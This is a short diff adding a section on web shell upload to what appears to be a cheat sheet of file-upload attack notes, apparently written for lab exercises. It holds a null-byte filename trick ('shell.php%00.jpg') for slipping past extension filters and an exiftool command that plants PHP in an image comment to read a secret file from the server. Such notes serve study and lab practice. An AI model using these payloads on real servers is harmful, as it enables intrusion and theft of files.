@@ -45,3 +45,12 @@ Defaults php extensions
 .inc
 ```
 
+# Web shell upload via obfuscated file extension
+
+filename="shell.php%00.jpg"
+
+
+
+```
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" shell.jpg -o shell.php
+```
